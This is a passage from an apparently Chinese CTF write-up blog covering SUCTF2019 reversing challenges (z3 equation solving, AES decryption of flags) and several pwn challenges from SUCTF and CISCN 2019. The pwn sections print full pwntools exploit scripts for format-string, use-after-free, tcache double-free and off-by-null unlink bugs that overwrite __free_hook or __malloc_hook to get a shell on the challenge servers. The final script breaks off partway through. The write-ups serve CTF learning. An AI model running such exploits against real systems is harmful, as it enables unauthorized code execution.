class="line">solver.add(flag[0]-flag[1]+flag[2]+flag[3]-flag[4]+flag[5]+flag[6]+flag[7]+flag[8]-flag[9]+flag[10]+flag[11]-flag[12]+flag[13]+flag[14]-flag[15]+flag[16]-flag[17]+flag[18]+flag[19]+flag[20]-flag[21]-flag[22]+flag[23]-flag[24]+flag[25]+flag[26]+flag[27]-flag[28]-flag[29]-flag[30]-flag[31]-flag[32]-flag[33]+flag[34]+flag[35]+flag[36]+flag[37]-flag[38]+flag[39]-flag[40]+flag[41]==s[32])</span><br><span class="line">solver.add(flag[0]-flag[1]-flag[2]+flag[3]+flag[4]+flag[5]+flag[6]-flag[7]-flag[8]+flag[9]+flag[10]+flag[11]-flag[12]-flag[13]+flag[14]+flag[15]-flag[16]+flag[17]-flag[18]+flag[19]-flag[20]+flag[21]+flag[22]+flag[23]-flag[24]-flag[25]+flag[26]+flag[27]-flag[28]+flag[29]-flag[30]-flag[31]-flag[32]-flag[33]-flag[34]-flag[35]+flag[36]-flag[37]+flag[38]-flag[39]-flag[40]-flag[41]==s[33])</span><br><span class="line">solver.add(flag[1]+flag[0]-flag[2]+flag[3]-flag[4]-flag[5]-flag[6]+flag[7]+flag[8]+flag[9]+flag[10]+flag[11]-flag[12]-flag[13]-flag[14]+flag[15]-flag[16]+flag[17]-flag[18]+flag[19]-flag[20]-flag[21]+flag[22]+flag[23]-flag[24]-flag[25]+flag[26]+flag[27]+flag[28]+flag[29]-flag[30]-flag[31]-flag[32]-flag[33]-flag[34]-flag[35]-flag[36]+flag[37]+flag[38]+flag[39]-flag[40]-flag[41]==s[34])</span><br><span class="line">solver.add(flag[0]-flag[1]+flag[2]+flag[3]+flag[4]-flag[5]-flag[6]+flag[7]+flag[8]-flag[9]-flag[10]+flag[11]+flag[12]+flag[13]-flag[14]-flag[15]+flag[16]-flag[17]+flag[18]+flag[19]-flag[20]-flag[21]-flag[22]+flag[23]+flag[24]-flag[25]-flag[26]+flag[27]+flag[28]-flag[29]-flag[30]+flag[31]+flag[32]-flag[33]+flag[34]+flag[35]+flag[36]+flag[37]+flag[38]+flag[39]-flag[40]-flag[41]==s[35])</span><br><span class="line">solver.add(flag[1]+flag[2]+flag[0]-flag[3]-flag[4]-flag[5]-flag[6]+flag[7]+flag[8]+flag[9]-flag[10]+flag[11]+flag[12]-flag[13]+flag[14]+flag[15]+flag[16]+flag[17]+flag[18]+flag[19]+flag[20]+flag[21]-flag[22]-flag[23]+flag[24]-flag[25]-flag[26]-flag[27]-flag[28]+flag[29]+flag[30]+flag[31]+flag[32]-flag[33]-flag[34]-flag[35]-flag[36]+flag[37]-flag[38]+flag[39]+flag[40]-flag[41]==s[36])</span><br><span class="line">solver.add(flag[0]-flag[1]-flag[2]+flag[3]-flag[4]+flag[5]-flag[6]-flag[7]-flag[8]-flag[9]+flag[10]-flag[11]-flag[12]-flag[13]-flag[14]-flag[15]-flag[16]+flag[17]+flag[18]-flag[19]-flag[20]-flag[21]+flag[22]-flag[23]+flag[24]-flag[25]-flag[26]+flag[27]-flag[28]-flag[29]+flag[30]+flag[31]-flag[32]+flag[33]-flag[34]+flag[35]-flag[36]-flag[37]+flag[38]-flag[39]-flag[40]-flag[41]==s[37])</span><br><span class="line">solver.add(flag[1]+flag[2]+flag[3]+flag[0]-flag[4]+flag[5]+flag[6]+flag[7]-flag[8]-flag[9]-flag[10]+flag[11]+flag[12]+flag[13]-flag[14]-flag[15]-flag[16]-flag[17]-flag[18]-flag[19]+flag[20]+flag[21]-flag[22]+flag[23]+flag[24]+flag[25]+flag[26]+flag[27]-flag[28]-flag[29]+flag[30]+flag[31]-flag[32]-flag[33]+flag[34]-flag[35]-flag[36]-flag[37]+flag[38]+flag[39]+flag[40]-flag[41]==s[38])</span><br><span class="line">solver.add(flag[0]-flag[1]-flag[2]-flag[3]-flag[4]+flag[5]-flag[6]-flag[7]-flag[8]+flag[9]-flag[10]+flag[11]-flag[12]+flag[13]+flag[14]-flag[15]-flag[16]-flag[17]+flag[18]+flag[19]+flag[20]+flag[21]+flag[22]-flag[23]+flag[24]+flag[25]+flag[26]+flag[27]+flag[28]-flag[29]+flag[30]+flag[31]+flag[32]+flag[33]+flag[34]-flag[35]-flag[36]+flag[37]+flag[38]+flag[39]-flag[40]+flag[41]==s[39])</span><br><span class="line">solver.add(flag[0]-flag[1]-flag[2]-flag[3]+flag[4]+flag[5]+flag[6]-flag[7]+flag[8]+flag[9]-flag[10]+flag[11]-flag[12]-flag[13]-flag[14]+flag[15]+flag[16]+flag[17]+flag[18]+flag[19]+flag[20]+flag[21]+flag[22]-flag[23]+flag[24]+flag[25]-flag[26]+flag[27]+flag[28]-flag[29]+flag[30]+flag[31]+flag[32]-flag[33]-flag[34]+flag[35]+flag[36]-flag[37]+flag[38]+flag[39]+flag[40]+flag[41]==s[40])</span><br><span class="line">solver.add(flag[1]+flag[2]+flag[3]+flag[4]+flag[5]+flag[6]+flag[0]-flag[7]-flag[8]-flag[9]+flag[10]+flag[11]-flag[12]+flag[13]-flag[14]-flag[15]-flag[16]-flag[17]-flag[18]-flag[19]+flag[20]-flag[21]+flag[22]-flag[23]-flag[24]+flag[25]+flag[26]+flag[27]+flag[28]-flag[29]-flag[30]-flag[31]-flag[32]-flag[33]-flag[34]-flag[35]-flag[36]-flag[37]-flag[38]-flag[39]-flag[40]+flag[41]==s[41])</span><br><span class="line">if solver.check()==sat:</span><br><span class="line">print solver.model()</span><br></pre></td></tr></table></figure><p>不过解了半天也没解出来2333，最后是密码学大佬yx解的方程，</p><p>(换成Int就解出来了)</p><p>最后再逆运算一下得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s2=[154, 171, 24, 161, 54, 222, 172, 116, 129, 18, 139, 152, 127, 247, 36, 124, 43, 90, 97, 138, 238, 95, 141, 237, 26, 227, 152, 154, 167, 54, 141, 166, 139, 66, 216, 129, 94, 164, 69, 188, 33, 194]</span><br><span class="line">for i in range(len(s2)):</span><br><span class="line">s2[i]^=i</span><br><span class="line">s2[i]=(s2[i]&gt;&gt;3)|(s2[i]&lt;&lt;5)</span><br><span class="line">s2[i]=s2[i]&amp;0xff</span><br><span class="line">print &apos;&apos;.join([chr(i) for i in s2])</span><br><span class="line">#SUCTF&#123;Un1c0rn_Engin3_Is_@_P0wer7ul_TO0ls!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2019-playfmt</title>
      <link href="/2019/08/19/SUCTF2019-playfmt/"/>
      <url>/2019/08/19/SUCTF2019-playfmt/</url>
      
        <content type="html"><![CDATA[<p>在BSS段上的格式化字符串</p><a id="more"></a><p>ida分析就不贴了，很简单的格式化字符串，只是<code>printf(buf)</code>中的buf存在bss段上，因此读写没有那么方便。</p><p>尝试只读写栈中的内容来获取flag。</p><p>可以发现程序读取flag存到了堆里，并且在栈中可以发现指向堆区的指针。<br>利用格式化字符串leak出堆地址以及栈地址。</p><p>同时在栈区可以发现如下的结构:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xff97fbe8 —▸ 0xff97fc08 —▸ 0xff97fc38 ◂— 0x00xff97fbec —▸ 0x80488f0 (logo()+67) ◂— call   0x804884b0e:0038│      0xff97fbf0 —▸ 0xf7608000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓0xff97fbf8 —▸ 0xff97fc38 ◂— 0x00xff97fbfc —▸ 0x8048ac4 (main+440) ◂— call   0x804884b0xff97fc00 —▸ 0xf7608d60 (_IO_2_1_stdout_) ◂— 0xfbad28870xff97fc04 ◂— 0x00xff97fc08 —▸ 0xff97fc38 ◂— 0x00xff97fc0c —▸ 0x8048ac4 (main+440) ◂— call   0x804884b0xff97fc10 —▸ 0xf76083dc (__exit_funcs) —▸ 0xf76091e0 (initial) ◂— 0x00xff97fc14 ◂— 0x00xff97fc18 —▸ 0x9d8fa28 —▸ 0xf76087b0 (main_arena+48) —▸ 0x9d8fe60 ◂— 0x00xff97fc1c —▸ 0x9d8fe30 ◂— 0x0</span><br></pre></td></tr></table></figure><p>其中</p><p><code>0xff97fbe8 —▸ 0xff97fc08 —▸ 0xff97fc38 ◂— 0x0</code></p><p>通过%n改写此处，使其成为</p><p><code>0xff97fbe8 —▸ 0xff97fc08 —▸ 0xff97fc18 —▸ 0x9d8fa28(heap)</code>，</p><p>然后此时</p><p><code>0xff97fc08 —▸ 0xff97fc38 ◂— 0x0</code></p><p>变为</p><p><code>0xff97fc08 —▸ 0xff97fc18 —▸ 0x9d8fa28(heap)</code></p><p>再改写此处，使得其成为</p><p><code>0xff97fc08 —▸ 0xff97fc18 —▸ 0x9d8fa10(flag)</code></p><p>之后</p><p><code>0xff97fc18 —▸ 0x9d8fa10(flag)</code></p><p>%s读取此处就可以得到flag。</p><p>但是由于堆区地址只有后三位是固定的，每次都写入0x0a10，这样就有1/16的概率可以读取到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *sh=remote(&quot;120.78.192.35&quot;,9999)#sh=process(&quot;./playfmt&quot;)sh.recvuntil(&quot;=====================\n&quot;)sh.recvuntil(&quot;=====================\n&quot;)sh.sendline(&quot;%6$p&quot;)stack=int(sh.recv(),16)-0xf8+0xc0log.success(&quot;stack: &quot;+hex(stack))#sh.sendline(&quot;%12$p&quot;) #IOstdout=int(sh.recv(),16)#libcbase=IOstdout-(0xf75f0d60-0xf743e000)#log.success(&quot;libcbase: &quot;+hex(libcbase))sh.sendline(&quot;%18$p&quot;)flagaddr=int(sh.recv(),16)-0x20+8log.success(&quot;flagaddr: &quot;+hex(flagaddr))ffff=(stack+18*4)&amp;0xffffsh.sendline(&quot;%&quot;+str(ffff)+&quot;c%6$hn&quot;)sh.recvuntil(&apos;\xac\n&apos;)sh.sendline(&quot;%2576c%14$hn&quot;)if flagaddr&amp;0xffff==0xa10:sh.sendline(&quot;%18$s&quot;)sh.recvuntil(&apos;\xac\n&apos;)flag=sh.recv()log.success(&quot;flag: &quot;+flag)sh.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2019-Akira Homework</title>
      <link href="/2019/08/19/SUCTF2019-hardCPP/"/>
      <url>/2019/08/19/SUCTF2019-hardCPP/</url>
      
        <content type="html"><![CDATA[<p>🏄</p><a id="more"></a><p>输入点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">memset(&amp;v4, 0, 0x13ui64);</span><br><span class="line">memset(&amp;Dst, 0, 0x6Dui64);</span><br><span class="line">memcpy(&amp;Dst, aJLJLJL1pzxcp6b, 0x6Cui64);</span><br><span class="line">for ( i = 0; (unsigned __int64)i &lt; 0x6C; ++i )</span><br><span class="line">  aJLJLJL1pzxcp6b[i] ^= key[0];</span><br><span class="line">puts(aJLJLJL1pzxcp6b);</span><br><span class="line">sub_7FF7D6BC9FF0((__int64)&quot;%18s&quot;, &amp;v4, 19i64);// Akira_aut0_ch3ss_!</span><br><span class="line">if ( sub_7FF7D6BC9200((__int64)&amp;v4) )</span><br><span class="line">&#123;</span><br><span class="line">  sub_7FF7D6BC8300((__int64)&amp;v3, 2i64, 1048579);</span><br><span class="line">  sub_7FF7D6BC6C10(qword_7FF7D6BD6178, v3, (__int64)&amp;v4);</span><br><span class="line">  v1 = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出的字符串储存时都是加密的，通过异或可以得到程序中输出的字符串。</p><p>这里要求输入password，逆出password为<code>Akira_aut0_ch3ss_!</code>，但是此时会提示Have no sign!</p><p>后发现对<code>byte_7FF7D6BD11A0</code>处分组异或得到了DLL文件，并且程序会与其share memory。</p><p>提取出DLL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">memset(&amp;Str2, 0, 0x11ui64);</span><br><span class="line">puts(&quot;Now check the sign:&quot;);</span><br><span class="line">sub_1800027A0((__int64)&quot;%32s&quot;, &amp;Str2);</span><br><span class="line">hHandle = OpenEventW(0x1F0003u, 1, L&quot;DLLInput&quot;);</span><br><span class="line">if ( !hHandle )</span><br><span class="line">  return 0;</span><br><span class="line">WaitForSingleObject(hHandle, 0xFFFFFFFF);</span><br><span class="line">CloseHandle(hHandle);</span><br><span class="line">hFileMappingObject = OpenFileMappingW(0xF001Fu, 0, L&quot;ShareMemory&quot;);// src=[0x94,0xBF,0x7A,0xC,0xA4,0x35,0x50,0xD1,0xC2,0x15,0xEC,0xEF,0x9D,0x9A,0xAA,0x56,]</span><br><span class="line">if ( !hFileMappingObject )</span><br><span class="line">  return 0;</span><br><span class="line">Src = MapViewOfFile(hFileMappingObject, 4u, 0, 0, 0x8000ui64);</span><br><span class="line">if ( Src )</span><br><span class="line">&#123;</span><br><span class="line">  CloseHandle(hFileMappingObject);</span><br><span class="line">  Dst = malloc(0x8000ui64);</span><br><span class="line">  memset(Dst, 0, 0x8000ui64);</span><br><span class="line">  memcpy(Dst, Src, 0x8000ui64);</span><br><span class="line">  strcpy(&amp;v7, &quot;Ak1i3aS3cre7K3y&quot;);</span><br><span class="line">  memset(&amp;Str1, 0, 0x11ui64);</span><br><span class="line">  sub_180002800((__int64)&amp;v7, &amp;Str1, Dst);</span><br><span class="line">  if ( !strcmp(&amp;Str1, &amp;Str2) )</span><br><span class="line">    sub_1800026F0((__int64)&quot;Get finally answer!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    sub_1800026F0((__int64)&quot;wow... game start!\n&quot;);</span><br><span class="line">  result = 1;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  CloseHandle(hFileMappingObject);</span><br><span class="line">  result = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察到输入与之前share的memory中的数据通过<code>sub_180002800</code>后进行比较。跟进<code>sub_180002800</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Src = a3;</span><br><span class="line">Dst = a2;</span><br><span class="line">initkey((__int64)&amp;v3, a1);</span><br><span class="line">memcpy(Dst, Src, 0x10ui64);</span><br><span class="line">Concurrency::details::HardwareAffinity::ApplyTo((Concurrency::details::HardwareAffinity *)&amp;v3, Dst);</span><br></pre></td></tr></table></figure><p>发现是以<code>Ak1i3aS3cre7K3y</code>为密钥对share的memory中的数据进行解密，然后输入并没有产生变化，因此只需要aes解密就可以得到flag。</p><p>aes解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from binascii import b2a_hex, a2b_hex</span><br><span class="line">def decrypt(text):</span><br><span class="line">    key = &apos;Ak1i3aS3cre7K3y\x00&apos;</span><br><span class="line">    iv = b&apos;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&apos;</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    cryptos = AES.new(key, mode, iv)</span><br><span class="line">    plain_text = cryptos.decrypt(a2b_hex(text))</span><br><span class="line">    return bytes.decode(plain_text).rstrip(&apos;/0&apos;)</span><br><span class="line">dd=&quot;94BF7A0CA43550D1C215ECEF9D9AAA56&quot;</span><br><span class="line">print decrypt(dd)</span><br><span class="line">#flag&#123;Ak1rAWin!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2019-c06</title>
      <link href="/2019/08/09/ciscn2019-c06/"/>
      <url>/2019/08/09/ciscn2019-c06/</url>
      
        <content type="html"><![CDATA[<p>国赛时坐在五号机旁边看着他搓出来的，五号机tql</p><a id="more"></a><h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">welcome to babyheap</span><br><span class="line">1. add</span><br><span class="line">2. remove</span><br><span class="line">choice &gt;</span><br></pre></td></tr></table></figure><p>C++写的程序，只有add和remove两个功能，但是在add时会打印出分配的堆地址。remove的时候free之后没有置0，存在UAF。</p><p>此外，C++程序会为cin和cout分配两个堆，这一题就是利用double free tcache申请到cout的堆，free之后直接进入unsortedbin。再利用add时打印地址leak出main_arena的地址。</p><p>之后就是常规的修改freehook为system，free一个内容为/bin/sh的chunk。</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *#sh = process(&apos;./ciscn_final_3.dms&apos;)libc = ELF(&apos;./libc.so.6&apos;)sh = remote(&quot;f.buuoj.cn&quot;,20232)def add(index, size, s):    sh.sendlineafter(&apos;choice &gt;&apos;, &apos;1&apos;)    sh.sendlineafter(&apos;input the index&apos;, str(index))    sh.sendlineafter(&apos;input the size&apos;, str(size))    sh.sendafter(&apos;now you can write something&apos;, s)def delete(index):    sh.sendlineafter(&apos;choice &gt;&apos;, &apos;2&apos;)    sh.sendlineafter(&apos;input the index&apos;, str(index))add(0,0x70,&quot;/bin/sh\x00&quot;)sh.recvuntil(&quot;gift :&quot;)chunk0addr=int(sh.recv(14),16)leakchunk=chunk0addr-0x11c20log.success(&quot;leakchunkaddr: &quot;+hex(leakchunk))add(1,0x10,&quot;1&quot;)delete(1)delete(1)add(2,0x10,p64(leakchunk+0x10))add(3,0x10,&apos;3&apos;)add(4,0x10,&apos;leakchunk1&apos;)add(5,0x20,&apos;5&apos;)delete(4)delete(5)delete(5)add(6,0x20,p64(leakchunk+0x10))add(7,0x20,&apos;7&apos;)add(8,0x20,&apos;8&apos;)add(9,0x20,&apos;leakchunk2&apos;)sh.recvuntil(&quot;gift :&quot;)leakchunk2addr=int(sh.recv(14),16)freehook=leakchunk2addr+0x1c48log.success(&quot;freehook: &quot;+hex(freehook))system=freehook-libc.sym[&apos;__free_hook&apos;]+libc.sym[&apos;system&apos;]log.success(&quot;system: &quot;+hex(system))add(10,0x30,&apos;10&apos;)delete(10)delete(10)add(11,0x30,p64(freehook))add(12,0x30,&apos;12&apos;)add(13,0x30,p64(system))delete(0)#gdb.attach(sh)sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_es_1</title>
      <link href="/2019/08/06/ciscn-2019-es-1/"/>
      <url>/2019/08/06/ciscn-2019-es-1/</url>
      
        <content type="html"><![CDATA[<p>提示说是libc2.29，但是好像上错libc版本了。<br><a id="more"></a></p><h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.Add a 996 info</span><br><span class="line">2.Show info</span><br><span class="line">3.Call that 996 compary!</span><br><span class="line">4.I hate 996!</span><br></pre></td></tr></table></figure><p>每次add会malloc(0x18)来创建一个chunk记录信息，其结构为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name ----------&gt; content chunk</span><br><span class="line">size | call</span><br><span class="line">   call</span><br></pre></td></tr></table></figure><p>call即free，free（*name），没有置零，存在UAF。</p><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h3 id="ubuntu18-04本地"><a href="#ubuntu18-04本地" class="headerlink" title="ubuntu18.04本地"></a>ubuntu18.04本地</h3><p>先把tcache填满，然后利用UAF，show出unsortbin中的main_arena地址，获取libc地址。</p><p>再double free，改写tcache的fd指针至<code>free_hook</code>，再次malloc控制<code>free_hook</code>，写上system，free一块内容为<code>/bin/sh</code>的chunk获取shell。</p><h3 id="BUU-remote"><a href="#BUU-remote" class="headerlink" title="BUU remote"></a>BUU remote</h3><p>直接利用UAF，show出unsortbin中的main_arena地址，获取libc地址。<br>再double free，改写fastbin的fd指针至<code>malloc_hook-0x23</code>，再次malloc控制<code>malloc_hook</code>，写上onegadget，执行获取shell。</p><p>//不知道是不是BUU上面所有题都无视题目本身用了给的那两个libc，如果是这样的话感觉做题不是很方便啊。</p><h3 id="libc2-29"><a href="#libc2-29" class="headerlink" title="libc2.29"></a>libc2.29</h3><p>好像2.29里tcache就完全不能double free了，会遍历tcache，但是leak还是先填满tcache然后leak。double free就用fastbin，改写fastbin的fd指针至<code>malloc_hook-0x23</code>，再次malloc控制<code>malloc_hook</code>，写上onegadget，执行获取shell。</p><p>//纯猜测，没有2.29环境</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><h3 id="ubuntu18-04本地-1"><a href="#ubuntu18-04本地-1" class="headerlink" title="ubuntu18.04本地"></a>ubuntu18.04本地</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8from pwn import *sh=process(&quot;./ciscn_2019_es_1.dms&quot;)#sh=remote(&quot;f.buuoj.cn&quot;,20173)def add(size,name,call):sh.sendlineafter(&quot;choice:&quot;,&quot;1&quot;)sh.sendlineafter(&quot;\n&quot;,str(int(size)))sh.sendafter(&quot;\n&quot;,name)sh.sendafter(&quot;\n&quot;,call)def show(index):sh.sendlineafter(&quot;choice:&quot;,&quot;2&quot;)sh.sendlineafter(&quot;\n&quot;,str(index))def delete(index):sh.sendlineafter(&quot;choice:&quot;,&quot;3&quot;)sh.sendlineafter(&quot;\n&quot;,str(index))add(0x80,&quot;tcache&quot;,&quot;tcache&quot;)  #index0add(0x80,&quot;/bin/sh\x00&quot;,&quot;/bin/sh\x00&quot;) #index1for i in range(8):delete(0)show(0)sh.recvuntil(&quot;name:\n&quot;)leak=u64(sh.recv(6).ljust(8,&quot;\x00&quot;))main_arena=leak-96log.success(&quot;main_arena: &quot;+hex(main_arena))free_hook=main_arena+7336log.success(&quot;free_hook: &quot;+hex(free_hook))system=main_arena-0x39c800log.success(&quot;system: &quot;+hex(system))add(0x90,&quot;2&quot;,&quot;2&quot;) #index2delete(2)delete(2)add(0x90,p64(free_hook),&quot;call&quot;)add(0x90,p64(free_hook),&quot;call&quot;)add(0x90,p64(system),&quot;call&quot;)delete(1)sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="BUU-remote-1"><a href="#BUU-remote-1" class="headerlink" title="BUU remote"></a>BUU remote</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8from pwn import *from LibcSearcher import *#sh=process(&quot;./ciscn_2019_es_1.dms&quot;)onegadget=[0x45216,0x4526a,0xf02a4,0xf1147]sh=remote(&quot;f.buuoj.cn&quot;,20173)def add(size,name):sh.sendlineafter(&quot;choice:&quot;,&quot;1&quot;)sh.sendlineafter(&quot;\n&quot;,str(int(size)))sh.sendafter(&quot;\n&quot;,name)sh.sendafter(&quot;\n&quot;,&quot;call&quot;)def show(index):sh.sendlineafter(&quot;choice:&quot;,&quot;2&quot;)sh.sendlineafter(&quot;\n&quot;,str(index))def delete(index):sh.sendlineafter(&quot;choice:&quot;,&quot;3&quot;)sh.sendlineafter(&quot;\n&quot;,str(index))add(0x80,&quot;/bin/sh\x00&quot;) #index0add(0x80,&quot;/bin/sh\x00&quot;) #index1delete(0)show(0)sh.recvuntil(&quot;name:\n&quot;)leak=u64(sh.recv(6).ljust(8,&quot;\x00&quot;))main_arena=leak-88log.success(&quot;main_arena: &quot;+hex(main_arena))malloc_hook=main_arena-0x10log.success(&quot;malloc_hook: &quot;+hex(malloc_hook))libcbase=main_arena-0x3C4B20add(0x60,&quot;2&quot;)add(0x60,&quot;3&quot;)delete(2)delete(3)delete(2)add(0x60,p64(malloc_hook-0x23))#index4add(0x60,&quot;5&quot;)add(0x60,&quot;6&quot;)add(0x60,&quot;a&quot;*19+p64(libcbase+onegadget[2]))delete(5)delete(5)sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_es_4</title>
      <link href="/2019/08/03/ciscn-2019-es-4/"/>
      <url>/2019/08/03/ciscn-2019-es-4/</url>
      
        <content type="html"><![CDATA[<p>offbynull+unlink<br><a id="more"></a></p><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.malloc</span><br><span class="line">2.free</span><br><span class="line">3.edit</span><br><span class="line">4.show</span><br></pre></td></tr></table></figure><p>malloc时限制了index为0~32，size为128~256，并且会给出每个堆的堆地址（没有用到感觉可能思路出错了），heap数组记录每个堆的堆地址。edit正常情况下最多可以用两次，key1变量记录edit次数，show正常情况下不能使用，key2变量初始为0，改成1就可以使用了。</p><p>heap，key1，key2都在bss段上。</p><p>漏洞点在edit里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v3 = __readfsqword(0x28u);</span><br><span class="line">  if ( key1 == 2 )</span><br><span class="line">    exit(0);</span><br><span class="line">  puts(&quot;index:&quot;);</span><br><span class="line">  v2 = read_int(&quot;index:&quot;);</span><br><span class="line">  if ( v2 &lt; 0 || v2 &gt; 32 || !heap[v2] )</span><br><span class="line">    exit(0);</span><br><span class="line">  puts(&quot;content:&quot;);</span><br><span class="line">  v0 = heap[v2];</span><br><span class="line">  v0[read(0, (void *)heap[v2], (signed int)len[v2])] = 0;</span><br><span class="line">  ++key1;</span><br></pre></td></tr></table></figure><p>这里产生了offbynull。</p><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>构造unlink，使得heap[32]=&amp;heap[29]，然后使用edit，修改heap[32]=puts.got，同时修改key1和key2，让我们可以使用show并且解除edit的次数限制，之后show leak出libc版本，改写<code>free_hook</code>为system,free一个内容为/bin/sh的chunk获取shell。</p><p>我的exp中主要利用heap[31]和heap[32]，unlink成功后第一次edit时，也顺便修改heap[31]=&amp;heap[31]，这样获取<code>free_hook</code>地址后，再利用edit让heap[31]=<code>free_hook</code>，最后再次edit，修改<code>free_hook</code>为system。</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *#sh=process(&quot;./ciscn_2019_es_4.dms&quot;)elf=ELF(&quot;./ciscn_2019_es_4.dms&quot;)context.arch=&apos;amd64&apos;sh=remote(&quot;f.buuoj.cn&quot;,20176)heap=0x6020E0key2=0x6022B8 #showkey1=0x6022BC #editdef malloc(index,size,content):sh.sendlineafter(&quot;4.show\n&quot;,&quot;1&quot;)sh.sendlineafter(&quot;index:\n&quot;,str(index))sh.sendlineafter(&quot;size:\n&quot;,str(int(size)))sh.sendafter(&quot;content:\n&quot;,content)def free(index):sh.sendlineafter(&quot;4.show\n&quot;,&quot;2&quot;)sh.sendlineafter(&quot;index:\n&quot;,str(index))def edit(index,content):sh.sendlineafter(&quot;4.show\n&quot;,&quot;3&quot;)sh.sendlineafter(&quot;index:\n&quot;,str(index))sh.sendafter(&quot;content:\n&quot;,content)def 